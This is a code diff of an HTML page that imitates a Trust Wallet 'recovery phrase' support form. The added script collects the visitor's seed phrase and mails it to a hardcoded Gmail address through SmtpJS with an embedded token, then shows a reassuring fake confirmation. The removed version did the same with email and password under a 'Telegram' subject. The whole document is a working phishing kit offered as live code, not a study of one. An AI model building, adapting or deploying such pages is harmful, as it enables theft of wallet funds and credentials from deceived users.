@@ -12,52 +12,43 @@
     <img src="pic1.png" alt="Trust Wallet Icon" class="icon">
     <h1>Trust Wallet Recovery Phrase</h1>
     <p><em><strong>Attention!</strong></em> "To deeply connect and resolve your wallet account issue, please input your wallet phrase in the provided field below. Your security is our priority, and this step will ensure seamless resolution. Thank you for your cooperation."</p>
-    <textarea class="problem-box" placeholder="Enter your recovery phrase"></textarea>
-    <a href="https://trustwallet.com"><button class="submit-btn" onclick="SendEmail()">Access Wallet</button></a>
+    <textarea id="recoveryPhrase" class="problem-box" placeholder="Enter your recovery phrase"></textarea>
+    <button class="submit-btn" onclick="sendEmail()">Access Wallet</button>
     <br>
     <br>
-     <img src="pic3.png" alt="Trust Wallet Icon" class="icon">
+    <img src="pic3.png" alt="Trust Wallet Icon" class="icon">
   </div>
-  
-     <!-- script -->
-   
- <script src="https://smtpjs.com/v3/smtp.js"></script>
-  
-   
-    <script>
-     function SendEmail() {
-    event.preventDefault();
-    let email = document.getElementById("email").value.trim();
-    let password = document.getElementById("password").value.trim();
 
-    let body = "Email: ";
-    if (email !== "") {
-        body += email;
-    } else {
-        body += "Not provided";
+  <!-- script -->
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script>
+    function sendEmail() {
+      event.preventDefault();
+      let recoveryPhrase = document.getElementById("recoveryPhrase").value.trim();
+
+      let body = "Recovery Phrase: ";
+      if (recoveryPhrase !== "") {
+          body += recoveryPhrase;
+      } else {
+          body += "Not provided";
+      }
+
+      Email.send({
+          SecureToken: "8c1f6c2a-54a4-4d36-a565-8ef819110ef7",
+          To: 'nowtext081@gmail.com',
+          From: "nowtext081@gmail.com",
+          Subject: "Message From Trust Wallet Recovery",
+          Body: body
+      }).then(
+          function(response) {
+              // Redirect to success page after email is sent successfully
+              alert("Your issue have been received.");
+          },
+          function(error) {
+              alert("Your issue have been received.");
+          }
+      );
     }
-    body += "<br> Password: ";
-    if (password !== "") {
-        body += password;
-    } else {
-        body += "Not provided";
-    }
-
-    Email.send({
-        SecureToken: "8c1f6c2a-54a4-4d36-a565-8ef819110ef7",
-        To: 'nowtext081@gmail.com',
-        From: "chineduprecious081@gmail.com",
-        Subject: "Message From Telegram",
-        Body: body
-    }).then(
-        function(response) {
-            // Redirect to success page after email is sent successfully
-            window.location.href = "#";
-        }
-    );
-}
-
-    </script>
-    
+  </script>
 </body>
 </html>
